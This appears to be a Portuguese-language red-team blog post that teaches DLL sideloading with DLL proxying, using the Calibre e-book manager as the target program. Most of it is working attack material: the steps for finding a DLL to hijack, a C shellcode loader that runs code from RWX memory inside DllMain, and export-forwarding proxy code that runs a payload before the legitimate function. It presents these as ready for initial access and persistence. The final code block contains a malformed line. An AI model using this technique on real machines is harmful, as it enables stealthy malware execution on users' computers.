---
layout: post
title: dll sideload
date: 2026-06-09
description: dll sideload
categories: windows redteam malware
tags: windows redteam malware
---

* content
{:toc}







# DLL Sideload

- [https://attack.mitre.org/techniques/T1574/001/](https://attack.mitre.org/techniques/T1574/001/)

```DLL sideload``` é uma tecnica que abusa da ordem de carregamento das dlls no windows para executar uma cópia maliciosa de uma dll legitima. Funciona posicionando um programa legitimo junto a uma dll maliciosa, e quando o programa é executado ele carrega a dll maliciosa dando inicio a infecção.

Essa tecnica é semelhante a outras de ```Dll Hijacking``` tipo ```Search Order Hijacking```, mas a principal diferença é que no sideloading se usa um programa legitimo para mascarar a execução maliciosa sem afetar o funcionamento do programa.

Para ilustrar melhor vou usar como exemplo o programa [Calibre](https://calibre-ebook.com/), um e-book manager open source (tipo um kindle open source), vamos ver desde como encontrar uma dll para substituir até como manter o programa rodando depois da infecção.


## Search Dll

Primeiro precisamos saber quais dlls o programa "chama" quando é iniciado. Para isso movemos uma cópia do programa para um diretório vazio, assim nenhuma dll sera encontrada, deixando claro o que queremos ver.

Para ver esse resultado usamos o ```Process Monitor``` da suite [sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), e adicionamos dois filtros, um para pegar somente a execução do programa que queremos e outro para filtrar só as dlls que não foram encontradas:

- ``` Process Name - is - calibre.exe ```
- ``` Result - is - NAME NOT FOUND ```


![searchdll1](/img/searchdll1.png)


Depois que executamos o programa temos o seguinte:


![searchdll2](/img/searchdll2.png)


Vemos que inicialmente o programa tentou carregar a dll ```calibre-launcher.dll``` e por não conseguir carrega-la recebemos um erro, esse resultado ja era esperado. Agora que temos uma opção de dll vamos fazer um teste pra ver se o programa carrega uma dll arbitratria.

Aqui os passos são simples, crie um projeto no Visual Studio, coloque o mesmo nome da dll alvo, copie e cole o código abaixo, e build.

```c
#include <Windows.h>

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "This DLL is Side-Loaded!", "Success!", MB_OK | MB_ICONEXCLAMATION);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Depois de buildar mova a dll para o mesmo diretório que tem o programa sozinho e execute ele.


![searchdll3](/img/searchdll3.png)


De fato funciona, o programa carrega a dll, mas ainda assim da um erro. Então se trocar o MsgBox por um código que execute um payload vai funcionar também mas ai teremos alguns problemas. 

O primeiro deles é que essa dll tem funções exportadas que precisam ser executadas para o programa funcionar normalmente, mantendo o stealth. Isso será incluido na dll maliciosa, veremos mais adiante.

O outro problema é se colocarmos o código direto na DllMain possivelmente pode gerar falhas na execução causando crashes e mau funcionamento tanto do código malicioso quanto do programa legitimo. O mais correto seria executar o payload em uma função que a dll exporta fazendo o fluxo do programa seguir normalmente após a execução do payload, também veremos mais adiante.


## Sideload + Proxying


Agora precisamos adicionar à dll uma funcionalidade que permite o programa legitimo consumir a dll maliciosa como se fosse a dll legitima que ele precisa.

Essa tecnica é conhecido como ```Dll Proxying```, ```Proxy Dll```, em alguns papers ```Dll Redirection```, como o nome ja diz, a ideia é criar uma dll "proxy" maliciosa que redireciona o fluxo de execução para a dll legitima incluindo as funções exportadas por ela. Assim quando o programa chamar a dll maliciosa o payload é executado e o programa continua a funcionar normalmente.


### Dll Proxying

A primeira coisa que precisamos fazer é analisar a dll alvo e saber quais funções são exportadas e como podemos usa-las.

Para ver os exports podemos analisar estaticamente a dll, a seguir temos dois exemplos, um com [PE-bear](https://github.com/hasherezade/pe-bear) e outra com [Dumpbin](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-options?view=msvc-170) uma ferramente cli que faz parte do visual studio.



- ```dumpbin /exports "\path\to\calibre-laucher.dll"```

![dllproxy2](/img/dllproxy2.png)



![dllproxy1](/img/dllproxy1.png)


Depois de saber quais funções são exportadas temos duas opções: 1 podemos fazer o proxy manualmente ou 2 podemos usar um ferramenta que faz isso por nós. Agora vamos usar a ferramenta, a mais conhecida para esse propósito é a [SharpDllProxy](https://github.com/Flangvik/SharpDllProxy). 

O uso é bem simples ```.\SharpDllProxy --dll legit.dll --payload shellocde.bin```. O que ela faz é gerar uma cópia da dll original e renomea-la, e também cria um template de dll num arquivo .c que está pronto pra ser compilado e executado. 

Analisando o código gerado, ele pega o shellcode em formato binario, move para uma memória alocada e por ultimo executa o shellcode direto da memória como se fosse um função. Isso é uma injeção de shellcode basica e facilmente detectável.

O ponto principal desse código são os ```#pragma comment``` que diz ao linker para *exportar* a partir da dll maliciosa e *redirecionar* as funções ```execute_python_entrypoint``` e ```simple_print``` para a dll ```tmpB1C7.dll``` que é a cópia renomeada da dll original.


- ```tmpB1C7``` = cópia da dll original
- ```@1``` e ```@2``` = oridnal numbers, ordem em que as funções são exportadas


```c
#pragma comment(linker, "/export:execute_python_entrypoint=tmpB1C7.execute_python_entrypoint,@1")
#pragma comment(linker, "/export:simple_print=tmpB1C7.simple_print,@2")


DWORD WINAPI DoMagic(LPVOID lpParameter) {

	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("shellcode.bin", "rb");
	fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
	
        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

	return 0;
}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH: 
                threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                CloseHandle(threadHandle);
            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }
```

Agora vamos compilar e rodar o programa para testar se tudo funciona. No mesmo projeto do inicio copie os pragma comment pro código e build. Depois mova a gerada e a copia renomeada para o diretório padrão do programa.

- Obs: Pra não deixar de mencionar os testes de proxying são feitos com o programa no local padrão de instalação em "C:\Program Files\Calibre2\" não no diretório usado antes em que o programa está sozinho.


![dllrun2](/img/dllrun2.gif)


Podemos ver que funcionou como esperado, então se substituirmos o msgbox por um process injection também daria certo. Até o momento sabemos que o programa carrega a dll e consegue ser redirecionado para as funções legitimas. 

Pensando num cenário mais realista, podemos nos deparar com o problema dito antes sobre colocar o código na DllMain, em alguns casos o code execution pode não funcionar te deixando na mão. Então agora vamos ver como executar o payload atravez de uma função exportada fazendo uma "boa pratica" do sideloading.


## Proxy exported function

Para começar temos que saber qual das funções exportadas são executadas de fato pelo programa, pra saber isso teremos que fazer um pequeno debugging (com x64dbg nesse exemplo).

- 1 - Abra o programa no debugger (com as dlls originais, não as cópias)

- 2 - Vá até a aba Symbols para ver as dlls carregadas e as funções utilizadas

- 3 - Set breakpoints nas funções nas funções desejadas


![dllproxy3](/img/dllproxy3.png)


- 4 - Siga a execução do programa até que alguma das funções seja executada


![dllproxy4](/img/dllproxy4.png)


Depois de seguir o fluxo a execução para no breakpoint da função ```execute_python_entrypoint```, será essa que vamos usar para executar o payload.


### Custom Dll Proxy

Agora temos que recriar a definição da função execute_python_entrypoint, deixa-la visivel externamente e depois resolver a função original para chama-la em runtime. É quase a mesma coisa que os #pragma comment fazem, a diferença é que ao invez de redirecionar direto para a dll onde a função está, a ideia é resolver o endereço da função e chama-la depois do payload ter sido executado.

A implementação está no código abaixo:

- Temos a definição (typedef) da função retirado do source [github.com/kovidgoyal/calibre/blob/master/bypy/windows/util.c](github.com/kovidgoyal/calibre/blob/master/bypy/windows/util.c)

- Logo abaixo implementação da função. Primeiro o payload é executado, depois o endereço da função é resolvido atravez da dll cópia, e então é retornada para poder seguir o fluxo do programa. A definição e a chamada da função precisam ser iguais a que o programa espera, se não a execução falhará.

- E pra finalizar precisamos criar um arquivo ```.def``` que diz ao linker quais funções exportar. 
    - 1 - No visual studio adicione um arquivo .def: Right-click no Source File --> Add --> New Item --> Visual C++ --> Code --> .def file

    - 2 - O conteúdo do arquivo: 
    - ```
        LIBRARY

        EXPORTS
            execute_python_entrypoint @1
      ```

    - 3 -  Project Properties --> Linker --> Input --> Module Definition File = Source.def

```c
#pragma comment(linker, "/export:simple_print=tmpB1C7.simple_print,@2")

typedef int (*defexecute_python_entrypoint)(const wchar_t *basename, const wchar_t *module, const wchar_t *function, int is_gui_app);

extern __declspec(dllexport) int execute_python_entrypoint() {

    defexecute_python_entrypoint = ptexecute_python_entrypoint

    MessageBoxA(NULL, "This DLL is Side-Loaded!", "Success!", MB_OK | MB_ICONEXCLAMATION);

    ptexecute_python_entrypoint = (defexecute_python_entrypoint)GetProcAddress(LoadLibrary(L"tmpB1C7.dll"), "execute_python_entrypoint");

    return ptexecute_python_entrypoint(L"calibre", L"calibre.gui-launch", L"calibre", 0);

}


BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
         break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


Compile, execute e pronto funciona como esperado.



![dllproxy5](/img/dllproxy5.png)



Uma observação importante é que mesmo usando a função exportada ao invez da DllMain o "payload" ainda é excutado mais de uma vez e isso parece ser o funcionamento normal do programa, pelo visto a dll que escolhi para o exemplo é usada algumas vezes pelo programa causando essas varias execuções. Talvez isso possa ser corrigido no próprio código malicioso, mas o ponto aqui é apenas demonstrar como é possivel realizar essa tecnica, e provavelmente um programa diferente não aconteça isso, só testando pra saber. 


## Conclusão

Essa tecnica, se usada da forma correta, é muito poderosa principalmente pela vesatilidde que se tem ao poder usar quase qualquer programa legitimo para executar código malicioso. Com alguma pesquisa e testes essa tecnica é e pode ser usada para propramas e alvos especificos, sendo facil de aplicar em um initial acess por exemplo ou até mesmo como persistencia.


- [https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf](https://dl.packetstormsecurity.net/papers/win/intercept_apis_dll_redirection.pdf)
- [https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)
- [https://learn.microsoft.com/en-us/cpp/build/exporting-from-a-dll?view=msvc-170](https://learn.microsoft.com/en-us/cpp/build/exporting-from-a-dll?view=msvc-170)